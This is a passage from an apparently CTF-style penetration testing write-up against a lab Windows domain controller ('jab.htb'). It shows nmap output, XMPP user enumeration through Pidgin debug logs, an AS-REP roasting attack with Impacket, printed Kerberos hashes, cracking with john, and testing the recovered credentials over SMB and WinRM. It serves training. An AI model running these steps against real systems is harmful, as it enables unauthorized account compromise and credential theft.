</span></span></span><span class=line><span class=cl><span class=go>|     Content-Type: text/html
</span></span></span><span class=line><span class=cl><span class=go>|     Accept-Ranges: bytes
</span></span></span><span class=line><span class=cl><span class=go>|     Content-Length: 223
</span></span></span><span class=line><span class=cl><span class=go>|     &lt;html&gt;
</span></span></span><span class=line><span class=cl><span class=go>|     &lt;head&gt;&lt;title&gt;Openfire HTTP Binding Service&lt;/title&gt;&lt;/head&gt;
</span></span></span><span class=line><span class=cl><span class=go>|     &lt;body&gt;&lt;font face=&#34;Arial, Helvetica&#34;&gt;&lt;b&gt;Openfire &lt;a href=&#34;http://www.xmpp.org/extensions/xep-0124.html&#34;&gt;HTTP Binding&lt;/a&gt; Service&lt;/b&gt;&lt;/font&gt;&lt;/body&gt;
</span></span></span><span class=line><span class=cl><span class=go>|     &lt;/html&gt;
</span></span></span><span class=line><span class=cl><span class=go>|   HTTPOptions:
</span></span></span><span class=line><span class=cl><span class=go>|     HTTP/1.1 200 OK
</span></span></span><span class=line><span class=cl><span class=go>|     Date: Wed, 22 May 2024 16:33:42 GMT
</span></span></span><span class=line><span class=cl><span class=go>|     Allow: GET,HEAD,POST,OPTIONS
</span></span></span><span class=line><span class=cl><span class=go>|   Help:
</span></span></span><span class=line><span class=cl><span class=go>|     HTTP/1.1 400 No URI
</span></span></span><span class=line><span class=cl><span class=go>|     Content-Type: text/html;charset=iso-8859-1
</span></span></span><span class=line><span class=cl><span class=go>|     Content-Length: 49
</span></span></span><span class=line><span class=cl><span class=go>|     Connection: close
</span></span></span><span class=line><span class=cl><span class=go>|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: No URI&lt;/pre&gt;
</span></span></span><span class=line><span class=cl><span class=go>|   RPCCheck:
</span></span></span><span class=line><span class=cl><span class=go>|     HTTP/1.1 400 Illegal character OTEXT=0x80
</span></span></span><span class=line><span class=cl><span class=go>|     Content-Type: text/html;charset=iso-8859-1
</span></span></span><span class=line><span class=cl><span class=go>|     Content-Length: 71
</span></span></span><span class=line><span class=cl><span class=go>|     Connection: close
</span></span></span><span class=line><span class=cl><span class=go>|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character OTEXT=0x80&lt;/pre&gt;
</span></span></span><span class=line><span class=cl><span class=go>|   RTSPRequest:
</span></span></span><span class=line><span class=cl><span class=go>|     HTTP/1.1 505 Unknown Version
</span></span></span><span class=line><span class=cl><span class=go>|     Content-Type: text/html;charset=iso-8859-1
</span></span></span><span class=line><span class=cl><span class=go>|     Content-Length: 58
</span></span></span><span class=line><span class=cl><span class=go>|     Connection: close
</span></span></span><span class=line><span class=cl><span class=go>|     &lt;h1&gt;Bad Message 505&lt;/h1&gt;&lt;pre&gt;reason: Unknown Version&lt;/pre&gt;
</span></span></span><span class=line><span class=cl><span class=go>|   SSLSessionReq:
</span></span></span><span class=line><span class=cl><span class=go>|     HTTP/1.1 400 Illegal character CNTL=0x16
</span></span></span><span class=line><span class=cl><span class=go>|     Content-Type: text/html;charset=iso-8859-1
</span></span></span><span class=line><span class=cl><span class=go>|     Content-Length: 70
</span></span></span><span class=line><span class=cl><span class=go>|     Connection: close
</span></span></span><span class=line><span class=cl><span class=go>|_    &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character CNTL=0x16&lt;/pre&gt;
</span></span></span><span class=line><span class=cl><span class=go>|_ssl-date: TLS randomness does not represent time
</span></span></span><span class=line><span class=cl><span class=go>7777/tcp  open  socks5              (No authentication; connection not allowed by ruleset)
</span></span></span><span class=line><span class=cl><span class=go>| socks-auth-info:
</span></span></span><span class=line><span class=cl><span class=go>|_  No authentication
</span></span></span><span class=line><span class=cl><span class=go>9389/tcp  open  mc-nmf              .NET Message Framing
</span></span></span><span class=line><span class=cl><span class=go>47001/tcp open  http                Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Not Found
</span></span></span><span class=line><span class=cl><span class=go>49664/tcp open  msrpc               Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>49665/tcp open  msrpc               Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>49666/tcp open  msrpc               Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>49668/tcp open  msrpc               Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>49673/tcp open  msrpc               Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>49674/tcp open  ncacn_http          Microsoft Windows RPC over HTTP 1.0
</span></span></span><span class=line><span class=cl><span class=go>49675/tcp open  msrpc               Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>49676/tcp open  msrpc               Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>49681/tcp open  msrpc               Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>49781/tcp open  msrpc               Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>59518/tcp open  msrpc               Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>8 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span></span><span class=line><span class=cl><span class=go>==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Host script results:
</span></span></span><span class=line><span class=cl><span class=go>|_clock-skew: mean: -2s, deviation: 0s, median: -2s
</span></span></span><span class=line><span class=cl><span class=go>| smb2-security-mode:
</span></span></span><span class=line><span class=cl><span class=go>|   3:1:1:
</span></span></span><span class=line><span class=cl><span class=go>|_    Message signing enabled and required
</span></span></span><span class=line><span class=cl><span class=go>| smb2-time:
</span></span></span><span class=line><span class=cl><span class=go>|   date: 2024-05-22T16:34:39
</span></span></span><span class=line><span class=cl><span class=go>|_  start_date: N/A
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span class=line><span class=cl><span class=go>Nmap done: 1 IP address (1 host up) scanned in 104.45 seconds
</span></span></span></code></pre></div><ul><li>Searching <code>what is jabber</code> shows us <a href=https://www.jabber.org/ class=external-link target=_blank rel=noopener>this page</a>. In short:</li></ul><div class="notice info"><div class=notice-title><i class="fa-solid fa-exclamation-circle" aria-hidden=true></i>Info</div><div class=notice-content>Jabber.org is the original messaging service based on <code>XMPP</code> and has been continuously offered for free since 1999.</div></div><p>So it is basically a messaging service.</p><ul><li>Searching how can I interact with this service and <code>XMPP</code>, I find <a href=https://pidgin.im/help/protocols/xmpp/ class=external-link target=_blank rel=noopener>this page</a>. For this, we need a tool called <code>Pidgin</code>. We can install it running:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo apt --fix-broken install
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ sudo apt update -y
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ sudo apt install pidgin -y --fix-missing
</span></span></span></code></pre></div><ul><li>Once installed, we can running using <code>pidgin</code> command:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ pidgin
</span></span></span></code></pre></div><p>and a new window appears</p><p><img alt="Jab 1" src=/pentesting/images/Jab_1.png></p><ul><li>Before adding a new user, we need to have a domain. For this I use <code>NetExec</code> and check <code>SMB</code> service:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ netexec smb 10.10.11.4
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>SMB         10.10.11.4      445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:jab.htb) (signing:True) (SMBv1:False)
</span></span></span></code></pre></div><p>where we see a domain: <code>jab.htb</code>.</p><ul><li>We add this new domain to our <code>/etc/hosts</code> file:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ echo &#39;10.10.11.4 jab.htb&#39; | sudo tee -a /etc/hosts
</span></span></span></code></pre></div><ul><li>Back to <code>Pidgin</code>, we click on <code>Add</code>, and fill the window with some data. Here the important thing is, in <code>Basic</code> tab, to select as protocol <code>XMPP</code>, tick the option <code>Create this new account on the server</code>, put the domain <code>jab.htb</code> and add the username/password.</li></ul><p><img alt="Jab 2" src=/pentesting/images/Jab_2.png></p><p>and in <code>Advanced</code> tab we add the target IP service:</p><p><img alt="Jab 3" src=/pentesting/images/Jab_3.png></p><ul><li>After clicking on <code>Add</code> we have a warning about the <code>SSL</code> certificate. We accept it.</li><li>We then have a window that asks for our credentials. In <code>User</code> and <code>Full name</code> field I just put my username <code>gunzf0x</code>; as email I add <code>gunzf0x@jab.htb</code> and provide the password. Once done we have a windows that says <code>Buddy List</code>, like the following:</li></ul><p><img alt="Jab 5" src=/pentesting/images/Jab_5.png></p><ul><li>At the top left side we can see the options <code>Buddies -> Join a Chat -> Room List -> Find Rooms</code> and we can see some chats:</li></ul><p><img alt="Jab 6" src=/pentesting/images/Jab_6.png></p><p><code>test</code> and <code>test2</code> are the available chats. I click on one of the chats and click <code>Join</code>. <code>test</code> chat does not work, but <code>test2</code> does. We can see:</p><p><img alt="Jab 7" src=/pentesting/images/Jab_7.png>
where I can see some encoded text.</p><ul><li>But decoding it does not show anything interesting:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ echo &#39;VGhlIGltYWdlIGRhdGEgZ29lcyBoZXJlCg==&#39; | base64 -d
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>The image data goes here
</span></span></span></code></pre></div><ul><li>After some searches, I note that we can find users. For this we can go back to <code>Buddy List</code>, then go to <code>Accounts</code>, set the mouse on our account and click on <code>Search for Users</code>. This will display another window that will search at <code>search.jab.htb</code> and click on <code>Search Directory</code>. This will display an &ldquo;Advanced Search&rdquo; window, where we just search for <code>*</code>(basically, search for everything) and click on <code>Ok</code>:</li></ul><p><img alt="Jab 8" src=/pentesting/images/Jab_8.png></p><ul><li>After some seconds I get another window that displays all the users:</li></ul><p><img alt="Jab 9" src=/pentesting/images/Jab_9.png></p><ul><li>They are a lot, and saving every one of them one by one is not an option. I search how to save <code>Pidgin</code> output in a file, and we have an <a href=https://pidgin.im/development/debugging/ class=external-link target=_blank rel=noopener>official documentation explaining it for debugging</a>. Therefore I close my current <code>Pidgin</code> window, and re-open it, but this time running the command:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ pidgin --debug |&amp; tee debug.log
</span></span></span></code></pre></div><p>to save all the output in a file called <code>debug.log</code></p><ul><li>Then, I repeat all the steps previously made (including logging, opening the chats, and then searching for users). After that, just close the <code>Pidgin</code> window and we have some output. Some lines show an output like:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ cat debug.log | grep &#34;jab.htb&#34;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>(16:21:49) jabber: Recv (ssl)(4082): ld var=&#34;jid&#34;&gt;&lt;value&gt;rgilbert@jab.htb&lt;/value&gt;&lt;/field&gt;&lt;field var=&#34;Username&#34;&gt;&lt;value&gt;rgilbert&lt;/value&gt;&lt;/field&gt;&lt;field var=&#34;Name&#34;&gt;&lt;value&gt;Richard Gilbert&lt;/value&gt;&lt;/field&gt;&lt;field var=&#34;Email&#34;&gt;&lt;value&gt;rgilbert@jab.htb&lt;/value&gt;&lt;/field&gt;&lt;/item&gt;&lt;item&gt;&lt;field var=&#34;jid&#34;&gt;&lt;value&gt;cobando@jab.htb&lt;/value&gt;&lt;/field&gt;&lt;field var=&#34;Username&#34;&gt;&lt;value&gt;cobando&lt;/value&gt;&lt;/field&gt;&lt;field var=&#34;Name&#34;&gt;&lt;value&gt;Charlie Obando&lt;/value&gt;&lt;/field&gt;&lt;field var=&#34;Email&#34;&gt;&lt;value&gt;cobando@jab.htb&lt;/value&gt;&lt;/field&gt;&lt;/item&gt;&lt;item&gt;&lt;field var=&#34;jid&#34;&gt;&lt;value&gt;jsegundo@jab.htb&lt;/value&gt;&lt;/field&gt;&lt;field var=&#34;Username&#34;&gt;&lt;value&gt;jsegundo&lt;/value&gt;&lt;/field&gt;&lt;field var=&#34;Name&#34;&gt;&lt;value&gt;Jessica Segundo&lt;/value&gt;&lt;/field&gt;&lt;field var=&#34;Email&#34;&gt;&lt;value&gt;jsegundo@jab.htb&lt;/value&gt;&lt;/field&gt;&lt;/item&gt;&lt;item&gt;&lt;field var=&#34;jid&#34;&gt;&lt;value&gt;fford@jab.htb&lt;/value&gt;&lt;/field&gt;&lt;field var=&#34;Username&#34;&gt;&lt;value&gt;fford&lt;/value&gt;&lt;/field&gt;&lt;field var=&#34;Name&#34;&gt;&lt;value&gt;Frank Ford&lt;/value&gt;&lt;/field&gt;&lt;field var=&#34;Email&#34;&gt;&lt;value&gt;fford@jab.htb&lt;/value&gt;&lt;/field&gt;&lt;/item&gt;&lt;item&gt;&lt;field var=&#34;jid&#34;&gt;&lt;value&gt;vpoland@jab.htb&lt;/value&gt;&lt;/field&gt;&lt;field var=&#34;Username&#34;&gt;&lt;value&gt;vpoland&lt;/value&gt;&lt;/field&gt;&lt;field var=&#34;Name&#34;&gt;&lt;value&gt;Violet Poland&lt;/value&gt;&lt;/field&gt;&lt;field var=&#34;Email&#34;&gt;&lt;value&gt;vpoland@jab.htb&lt;/value&gt;&lt;/field&gt;&lt;/item&gt;&lt;item&gt;&lt;field var=&#34;jid&#34;&gt;&lt;value&gt;astucky@jab.htb&lt;/value&gt;&lt;/field&gt;&lt;field var=&#34;Username&#34;&gt;&lt;value&gt;astucky&lt;/value&gt;&lt;/field&gt;&lt;field var=&#34;Name&#34;&gt;&lt;value&gt;Antonio Stucky&lt;/value&gt;&lt;/field&gt;&lt;field var=&#34;Email&#34;&gt;&lt;value&gt;astucky@jab.htb&lt;/value&gt;&lt;/field&gt;&lt;/item&gt;&lt;item&gt;&lt;field var=&#34;jid&#34;&gt;&lt;value&gt;jsims@jab.htb&lt;/value&gt;&lt;/field&gt;&lt;field var=&#34;Username&#34;&gt;&lt;value&gt;jsims&lt;/value&gt;&lt;/field&gt;&lt;field var=&#34;Name&#34;&gt;&lt;value&gt;Jason Sims&lt;/value&gt;&lt;/field&gt;&lt;field var=&#34;Email&#34;&gt;&lt;value&gt;jsims@jab.htb&lt;/value&gt;&lt;/field&gt;&lt;/item&gt;&lt;item&gt;&lt;field var=&#34;jid&#34;&gt;&lt;value&gt;fsullivan@jab.htb&lt;/value&gt;&lt;/field&gt;&lt;field var=&#34;Username&#34;&gt;&lt;value&gt;fsullivan&lt;/value&gt;&lt;/field&gt;&lt;field var=&#34;Name&#34;&gt;&lt;value&gt;Fred Sullivan&lt;/value&gt;&lt;/field&gt;&lt;field var=&#34;Email&#34;&gt;&lt;value&gt;fsullivan@jab.htb&lt;/value&gt;&lt;/field&gt;&lt;/item&gt;&lt;item&gt;&lt;field var=&#34;jid&#34;&gt;&lt;value&gt;ktaylor@jab.htb&lt;/value&gt;&lt;/field&gt;&lt;field var=&#34;Username&#34;&gt;&lt;value&gt;ktaylor&lt;/value&gt;&lt;/field&gt;&lt;field var=&#34;Name&#34;&gt;&lt;value&gt;Kathy Taylor&lt;/value&gt;&lt;/field&gt;&lt;field var=&#34;Email&#34;&gt;&lt;value&gt;ktaylor@jab.htb&lt;/value&gt;&lt;/field&gt;&lt;/item&gt;&lt;item&gt;&lt;field var=&#34;jid&#34;&gt;&lt;value&gt;vhanson@jab.htb&lt;/value&gt;&lt;/field&gt;&lt;field var=&#34;Username&#34;&gt;&lt;value&gt;vhanson&lt;/value&gt;&lt;/field&gt;&lt;field var=&#34;Name&#34;&gt;&lt;value&gt;Vicky Hanson&lt;/value&gt;&lt;/field&gt;&lt;field var=&#34;Email&#34;&gt;&lt;value&gt;vhanson@jab.htb&lt;/value&gt;&lt;/field&gt;&lt;/item&gt;&lt;item&gt;&lt;field var=&#34;jid&#34;&gt;&lt;value&gt;rtuttle@jab.htb&lt;/value&gt;&lt;/field&gt;&lt;field var=&#34;Username&#34;&gt;&lt;value&gt;rtuttle&lt;/value&gt;&lt;/field&gt;&lt;field var=&#34;Name&#34;&gt;&lt;value&gt;Renee Tuttle&lt;/value&gt;&lt;/field&gt;&lt;field var=&#34;Email&#34;&gt;&lt;value&gt;rtuttle@jab.htb&lt;/value&gt;&lt;/field&gt;&lt;/item&gt;&lt;item&gt;&lt;field var=&#34;jid&#34;&gt;&lt;value&gt;hrobichaux@jab.htb&lt;/value&gt;&lt;/field&gt;&lt;field var=&#34;Username&#34;&gt;&lt;value&gt;hrobichaux&lt;/value&gt;&lt;/field&gt;&lt;field var=&#34;Name&#34;&gt;&lt;value&gt;Helen Robichaux&lt;/value&gt;&lt;/field&gt;&lt;field var=&#34;Email&#34;&gt;&lt;value&gt;hrobichaux@jab.htb&lt;/value&gt;&lt;/field&gt;&lt;/item&gt;&lt;item&gt;&lt;field var=&#34;jid&#34;&gt;&lt;value&gt;scamp@jab.htb&lt;/value&gt;&lt;/field&gt;&lt;field var=&#34;Username&#34;&gt;&lt;value&gt;scamp&lt;/value&gt;&lt;/field&gt;&lt;field var=&#34;Name&#34;&gt;&lt;value&gt;Shawn Camp&lt;/value&gt;&lt;/field&gt;&lt;field var=&#34;Email&#34;&gt;&lt;value&gt;scamp@jab.htb&lt;/value&gt;&lt;/field&gt;&lt;/item&gt;&lt;item&gt;&lt;field var=&#34;jid&#34;&gt;&lt;value&gt;lcampbell@jab.htb&lt;/value&gt;&lt;/field&gt;&lt;field var=&#34;Username&#34;&gt;&lt;value&gt;lcampbell&lt;/value&gt;&lt;/field&gt;&lt;field var=&#34;Name&#34;&gt;&lt;value&gt;Luis Campbell&lt;/value&gt;&lt;/field&gt;&lt;field var=&#34;Email&#34;&gt;&lt;value&gt;lcampbell@jab.htb&lt;/value&gt;&lt;/field&gt;&lt;/item&gt;&lt;item&gt;&lt;field var=&#34;jid&#34;&gt;&lt;value&gt;kanderson@jab.htb&lt;/value&gt;&lt;/field&gt;&lt;field var=&#34;Username&#34;&gt;&lt;value&gt;kanderson&lt;/value&gt;&lt;/field&gt;&lt;field var=&#34;Name&#34;&gt;&lt;value&gt;Kathrine Anderson&lt;/value&gt;&lt;/field&gt;&lt;field var=&#34;Email&#34;&gt;&lt;value&gt;kanderson@jab.htb&lt;/value&gt;&lt;/field&gt;&lt;/item&gt;&lt;item&gt;&lt;field var=&#34;jid&#34;&gt;&lt;value&gt;kclark@jab.htb&lt;/value&gt;&lt;/field&gt;&lt;field var=&#34;Username&#34;&gt;&lt;value&gt;kclark&lt;/value&gt;&lt;/field&gt;&lt;field var=&#34;Name&#34;&gt;&lt;value&gt;Kristen Clark&lt;/value&gt;&lt;/field&gt;&lt;field var=&#34;Email&#34;&gt;&lt;value&gt;kclark@jab.htb&lt;/value&gt;&lt;/field&gt;&lt;/item&gt;&lt;item&gt;&lt;field var=&#34;jid&#34;&gt;&lt;value&gt;hbundy@jab.htb&lt;/value&gt;&lt;/field&gt;&lt;field var=&#34;Username&#34;&gt;&lt;value&gt;hbundy&lt;/value&gt;&lt;/field&gt;&lt;field var=&#34;Name&#34;&gt;&lt;value&gt;Harold Bundy&lt;/value&gt;&lt;/field&gt;&lt;field var=&#34;Email&#34;&gt;&lt;value&gt;hbundy@jab.htb&lt;/value&gt;&lt;/field&gt;&lt;/item&gt;&lt;item&gt;&lt;field var=&#34;jid&#34;&gt;&lt;value&gt;kconnally@jab.htb&lt;/value&gt;&lt;/field&gt;&lt;field var=&#34;Username&#34;&gt;&lt;value&gt;kconnally&lt;/value&gt;&lt;/field&gt;&lt;field var=&#34;Name&#34;&gt;&lt;value&gt;Kristen Connall
</span></span></span></code></pre></div><ul><li>We can apply <code>Regular Expressions</code> with <code>grep</code> to obtain the account names and save them in a file:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ grep -oP &#39;&lt;value&gt;\K[^&lt;]+@jab.htb(?=&lt;/value&gt;)&#39; debug.log | sed &#39;s/@jab.htb//g&#39; | sort -u &gt; users.txt
</span></span></span></code></pre></div><ul><li>Now we can see if we can attempt an <code>AS-REP Roasting</code> attack to some of these users using <code>GetNPUsers.py</code> from <code>Impacket</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py jab.htb/ -usersfile users.txt -no-pass -format john -dc-ip 10.10.11.4 -outputfile hashes_getNPUsers
</span></span></span><span class=line><span class=cl><span class=go>Impacket v0.12.0.dev1 - Copyright 2023 Fortra
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[-] User aaaron doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
</span></span></span><span class=line><span class=cl><span class=go>[-] User aallen doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><ul><li>After this task finishes, we have hashes for 3 different users:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ cat hashes_getNPUsers
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=gp>$</span>krb5asrep<span class=nv>$jmontgomery</span>@JAB.HTB:20b36f25e794697e955c3b36f39ca428<span class=nv>$ad65a0ca4c5c5ca35aa2999eaa71c11496528ef18230c3a3db0f8017b54f7d6e7fcba7323faf80f7786cfd6fc99ef963eda01608477ee50d9844bc010f866d6cb83c6e1e2841ce6583c8cd90c2f6b180be5d4ad7f40bd751277a91d95327d0536108d4b6d84edaf4b4383138bc7418ecbc7b991fcbf9900cc08200efc043abe86d75c83bc2bdacf7a62aa9fe4df0db801d1d73b0177db303a3d5cabd053e194b0fe5d4a28c6b8ae85ce50c9f6c68721d54c989dc98791505707066c0c97afa2c9b074a4152ba4ee4339fff499394722a1cc4f23b56742e30c059492ee3b63f650fc4</span>
</span></span><span class=line><span class=cl><span class=gp>$</span>krb5asrep<span class=nv>$lbradford</span>@JAB.HTB:ae09761fba20b3aaf8a9dfdd2eeeb8a8<span class=nv>$9</span>fd7aeb9913883bc3875f5a527386cbb546cf548612fce72e2a6c4d8df31d87b31013965226125008edd44b2b94db75e4cbb2fab6e92e70d4f5a646ee7d7249476433eebd801aa3b7e89c19c9ac26fe4313af6ab519ba4e66b498b33a15cb1704ddb2c5e1f2d42bc94f9cc498279cf85956058867029c3d7166fd7dde730daa968975d4190537ef3c2a5027a6415d232dd5dabaa63ca4a08b2dc6fb0749fb9439b6d29e8e8f940e14bf0fe1aab17307e54e88e6f2ee8ff5bd14759ee03aa8bd1995319bba9a9917290b9b3735d2566b132ad57b54e8ce9a8b727a5640c4288f20101
</span></span><span class=line><span class=cl><span class=gp>$</span>krb5asrep<span class=nv>$mlowe</span>@JAB.HTB:6eee03d5d34f4457100fc8452f81e85d<span class=nv>$a76a718226c25796d970d3696d9128d1862c9b2e54506b162a86291616de87ed4471b354f711e484fca635c1069b3fc2664003f79f9791ee53534adb13025638727cd8d1b9360f9e461d1b2dd149739286ad035a79d0e18c48c0531759ea5adfb9e48061891ae6f3d47e0f2ca602b8cc79925328f338a72dec6dbc087fbfcc8ef333e6ef6a6e11dcd9c54484b03a23ece6a0ef88569bb5dbd029efd51c1019f39a69e3e904c4c17012359dd5970705ed1c5386ead6c911458357bb7266524eaeae9b7b2d6de4c75937a4370c68368c3fc767b6ab48c85b87c8f73b903147b585de3a</span>
</span></span></code></pre></div><ul><li>We attempt a <code>Brute Force Password Cracking</code> with <code>john</code> against these hashes and find:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ john --wordlist=/usr/share/wordlists/rockyou.txt hashes_getNPUsers
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Using default input encoding: UTF-8
</span></span></span><span class=line><span class=cl><span class=go>Loaded 3 password hashes with 3 different salts (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
</span></span></span><span class=line><span class=cl><span class=go>Will run 5 OpenMP threads
</span></span></span><span class=line><span class=cl><span class=go>Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
</span></span></span><span class=line><span class=cl><span class=go>Midnight_121     ($krb5asrep$jmontgomery@JAB.HTB)
</span></span></span><span class=line><span class=cl><span class=go>1g 0:00:00:23 DONE (2024-05-22 18:49) 0.04284g/s 614556p/s 1692Kc/s 1692KC/s  0841079575..*7¬°Vamos!
</span></span></span><span class=line><span class=cl><span class=go>Use the &#34;--show&#34; option to display all of the cracked passwords reliably
</span></span></span><span class=line><span class=cl><span class=go>Session completed.
</span></span></span></code></pre></div><p>where we have credentials: <code>jmontgomery:Midnight_121</code></p><ul><li>Now, I check if these credentials work in another service such as <code>SMB</code> with <code>NetExec</code>; and they work, but there is no interesting information:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ netexec smb 10.10.11.4 -u &#39;jmontgomery&#39; -p &#39;Midnight_121&#39; --shares
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>SMB         10.10.11.4      445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:jab.htb) (signing:True) (SMBv1:False)
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.4      445    DC01             [+] jab.htb\jmontgomery:Midnight_121
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.4      445    DC01             [*] Enumerated shares
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.4      445    DC01             Share           Permissions     Remark
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.4      445    DC01             -----           -----------     ------
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.4      445    DC01             ADMIN$                          Remote Admin
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.4      445    DC01             C$                              Default share
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.4      445    DC01             IPC$            READ            Remote IPC
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.4      445    DC01             NETLOGON        READ            Logon server share
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.4      445    DC01             SYSVOL          READ            Logon server share
</span></span></span></code></pre></div><p>and we don&rsquo;t have access via <code>Windows Remote Management</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ netexec winrm 10.10.11.4 -u &#39;jmontgomery&#39; -p &#39;Midnight_121&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>WINRM       10.10.11.4      5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:jab.htb)
</span></span></span><span class=line><span class=cl><span class=go>WINRM       10.10.11.4      5985   DC01             [-] jab.htb\jmontgomery:Midnight_121
</span></span></span></code></pre></div><ul><li>At this point, similar as we added our user to <code>Pidgin</code>, I add a user with the found credentials. The only difference is that when I add this new user I don&rsquo;t tick the option <code>Create this new account on the server</code>.</li><li>Once added, I go to <code>Accounts -> Manage Accounts</code>, select <code>jmontgomery</code> account, pass the credentials and log in with this user. If this does not work, after adding the and selecting the user, we can go to <code>Buddies -> Quit</code>, and then <code>Pidgin</code> will ask for the password for <code>jmontgomery</code> user. We pass the password found:</li></ul><p><img alt="Jab 10" src=/pentesting/images/Jab_10.png></p><ul><li>Now, similar as we did before, we will try to find chats. Go to <code>Buddies -> Join a Chat -> Room List -> Find Rooms</code>. Now I can see a new room called <code>pentest2003</code>. I select it and click on <code>Join</code>:</li></ul><p><img alt="Jab 11" src=/pentesting/images/Jab_11.png></p><ul><li>Now we have a new chat:</li></ul><p><img alt="Jab 12" src=/pentesting/images/Jab_12.png></p><ul><li>In this chat they talk about a security issue found in the past, that should be patched. Slightly different as we did, they use 